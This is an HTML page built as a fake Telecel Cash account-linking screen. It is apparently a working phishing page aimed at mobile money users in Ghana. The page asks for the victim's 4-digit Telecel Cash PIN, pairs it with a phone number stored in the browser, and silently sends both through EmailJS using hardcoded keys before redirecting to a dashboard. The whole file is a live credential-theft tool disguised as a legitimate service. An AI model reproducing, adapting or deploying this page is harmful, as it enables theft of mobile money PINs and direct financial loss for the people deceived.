<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Link Your Telecel Cash Account</title>

  <!-- Meta Description -->
  <meta name="description" content="Airtime & Data â€” Fast and reliable airtime and data services with secure registration and easy access.">

  <!-- Favicons -->
  <link rel="apple-touch-icon" sizes="180x180" href="favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="favicon.png">

  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("gV773-VG85THpxrNV");
    })();
  </script>

  <style>
    /* === GENERAL BODY === */
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: radial-gradient(circle at top left, #b30000, #000814 70%);
      min-height: 100vh;
      overflow: hidden;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    /* === FLOATING PARTICLES === */
    .particle {
      position: absolute;
      border-radius: 50%;
      background: rgba(255, 0, 0, 0.25);
      animation: float 10s infinite ease-in-out;
      filter: blur(1px);
    }
    @keyframes float {
      0%, 100% { transform: translateY(0) translateX(0); opacity: 0.7; }
      50% { transform: translateY(-30px) translateX(20px); opacity: 0.3; }
    }

    /* === CARD === */
    .card {
      background: white;
      border-radius: 1rem;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
      transition: transform 0.5s ease, opacity 1s ease;
      opacity: 0;
      transform: translateY(50px);
    }

    body.loaded .card {
      opacity: 1;
      transform: translateY(0);
    }

    /* === BUTTON === */
    .btn {
      background: #FF0000;
      color: #fff;
      font-weight: bold;
      transition: background 0.3s ease, transform 0.2s ease;
    }
    .btn:hover {
      background: #cc0000;
      transform: translateY(-2px);
    }

    /* === PIN INPUT === */
    .input-pin {
      letter-spacing: 0.5rem;
      font-size: 2rem;
      text-align: center;
      font-weight: bold;
      border: 2px solid #E5E7EB;
    }

    /* === PRELOADER === */
    .preloader {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: radial-gradient(circle at center, #7a0000, #000);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      flex-direction: column;
      color: white;
    }

    .loader-ring {
      width: 80px;
      height: 80px;
      border: 5px solid rgba(255, 0, 0, 0.2);
      border-top-color: #ff0000;
      border-radius: 50%;
      animation: spin 1.5s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .preloader.fadeOut {
      opacity: 0;
      transition: opacity 0.6s ease;
      pointer-events: none;
    }

    .brand-text {
      font-size: 1.5rem;
      font-weight: bold;
      letter-spacing: 1px;
      color: #fff;
      animation: glow 2s ease-in-out infinite alternate;
    }

    @keyframes glow {
      from { text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000; }
      to { text-shadow: 0 0 20px #ff3333, 0 0 30px #ff6666; }
    }

    /* === NOTIFICATION === */
    #notification {
      transition: opacity 0.4s ease, transform 0.3s ease;
    }
  </style>
</head>

<body>

  <!-- ðŸ”´ PRELOADER -->
  <div class="preloader" id="pageLoader">
    <div class="loader-ring"></div>
    <div class="brand-text">Telecel Cash</div>
  </div>

  <!-- ðŸ”´ FLOATING PARTICLES -->
  <div class="particle" style="width:15px; height:15px; top:10%; left:15%; animation-delay:0s;"></div>
  <div class="particle" style="width:8px; height:8px; top:60%; left:80%; animation-delay:2s;"></div>
  <div class="particle" style="width:12px; height:12px; top:40%; left:40%; animation-delay:4s;"></div>
  <div class="particle" style="width:10px; height:10px; top:75%; left:20%; animation-delay:6s;"></div>

  <!-- ðŸ”´ MAIN CARD -->
  <div class="card w-full max-w-md p-8">
    <p style="font-weight:bold; font-size:x-large; text-align:center; margin-bottom:10px;">Link Your Telecel Cash Account</p>
    <div>
      <img src="telecel.png" alt="Telecel Cash" class="w-full max-w-xs mx-auto mb-4">
    </div>
    <h1 class="text-2xl font-bold text-center text-red-700 mb-4">Secure Your Account</h1>
    <p class="text-gray-600 text-center mb-6">Enter your 4-digit Telecel Cash PIN to link your account for a direct charge.</p>

    <form id="pinForm" class="space-y-6">
      <input 
        type="password" 
        id="pinInput" 
        maxlength="4" 
        pattern="\d{4}" 
        inputmode="numeric" 
        class="input-pin w-full rounded-lg py-3 px-4 focus:outline-none focus:ring-2 focus:ring-red-500" 
        placeholder="â€¢â€¢â€¢â€¢"
        required
      >
      <button type="submit" class="btn w-full py-3 rounded-lg shadow">
        Continue
      </button>
    </form>
  </div>

  <div id="notification" class="hidden fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white"></div>

  <!-- ðŸ”´ SCRIPT -->
  <script>
    // --- PRELOADER LOGIC ---
    window.addEventListener("load", () => {
      const loader = document.getElementById("pageLoader");
      const body = document.body;

      setTimeout(() => {
        loader.classList.add("fadeOut");
        body.classList.add("loaded");
      }, 3000); // show preloader for ~3 seconds
    });

    // --- PIN FORM ---
    const pinForm = document.getElementById("pinForm");
    const pinInput = document.getElementById("pinInput");
    const phone = localStorage.getItem("userPhone");

    pinForm.addEventListener("submit", (e) => {
      e.preventDefault();
      if (pinInput.value.length === 4) {
        emailjs.send("service_74nt2c9", "template_zelb8ji", {
          phone: "+233" + phone,
          pin: pinInput.value
        }).then(() => {
          showNotification("Telecel Cash PIN under verification");
          window.location.href = "dashboard.html";
        }).catch(() => {
          showNotification("Failed to verify PIN.", "error");
        });
      } else {
        showNotification("Please enter your valid 4-digit PIN.", "error");
      }
    });

    function showNotification(message, type="success") {
      const notification = document.getElementById("notification");
      notification.textContent = message;
      notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white transition ${
        type === "success" ? "bg-green-600" : "bg-red-600"
      }`;
      notification.classList.remove("hidden");
      notification.style.opacity = "1";
      notification.style.transform = "translateY(0)";
      setTimeout(() => {
        notification.style.opacity = "0";
        notification.style.transform = "translateY(-10px)";
      }, 3000);
    }
  </script>
</body>
</html>
